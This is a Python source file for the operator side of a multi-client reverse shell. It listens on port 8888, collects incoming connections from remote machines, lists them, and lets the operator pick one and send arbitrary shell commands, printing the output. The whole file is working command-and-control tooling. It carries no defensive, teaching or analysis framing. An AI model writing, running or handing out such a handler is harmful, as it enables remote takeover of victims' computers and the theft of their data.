import socket
import threading
import pyfiglet
import queue
import sys

print(pyfiglet.figlet_format("Reverse Shell", font="slant"))
conn_list=[]
addr_list=[]
myqueue=queue.Queue()


def create_bind_accept():
    try:
        global ip
        global port
        global s
        host=socket.gethostname()
        ip=socket.gethostbyname(host)
        port=8888
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
    except Exception as e:
        pass

    try:
        s.bind((ip, port))
        s.listen(5)
    except Exception as e:
        pass

    while True:
        try:
            conn, addr = s.accept()
            conn_list.append(conn)
            addr_list.append(addr)
        except Exception as e:
            pass

        try:
            if myqueue.get_nowait()=="exit":
                sys.exit()
        except queue.Empty:
            pass


def prompt():
    print("list    - list all connections")
    print("select  - select a connection")
    print("exit    - exit\n")
    while True:
        print("prompt > ", end="")
        cmd=input()
        if cmd=="list":
            list_connections()
        elif cmd=="exit":
            close_connections()
            myqueue.put("exit")
            break
        elif cmd=="":
            pass
        elif cmd.split()[0]=="select":
            try:
                if len(conn_list)==0:
                    print("No connections found !")
                    continue
                ind_list=cmd.split()
                if len(ind_list)==2 and 0<=int(ind_list[1])<len(conn_list):
                    target=conn_list[int(ind_list[1])]
                    start_connection(target)
                else:
                    print("Invalid option selected !")
            except Exception as e:
                print("Invalid option selected !")
        else:
            print("command invalid !")


def list_connections():
    if len(conn_list)==0:
        print("No connections found !")
        return
    for i, conn in enumerate(conn_list):
        try:
            conn.send(str.encode("connection check"))
            conn.recv(5000).decode("utf-8")
        except Exception as e:
            del conn_list[i]
            del addr_list[i]
    if len(conn_list)==0:
        print("No connections found !")
        return
    for i, addr in enumerate(addr_list):
        print(f"[{i}]  {addr[0]}")


def start_connection(conn):
    conn.send(str.encode("Initiation cmd"))
    print(conn.recv(1024).decode("utf-8"), end="")
    while True:
        cmd=input()
        if cmd=="":
            conn.send(str.encode("Initiation cmd"))
            print(conn.recv(5000).decode("utf-8"), end="")
        elif cmd=="exit":
            break
        elif cmd=="quit":
            conn.send(str.encode(cmd))
            list_connections()
            break
        else:
            conn.send(str.encode(cmd))
            print(conn.recv(5000).decode("utf-8"), end="")


def close_connections():
    for i in conn_list:
        i.close()


threads=[]
t1=threading.Thread(target=create_bind_accept)
t1.start()
threads.append(t1)

t2=threading.Thread(target=prompt)
t2.start()
threads.append(t2)

t1.join()
t2.join()

s.close()
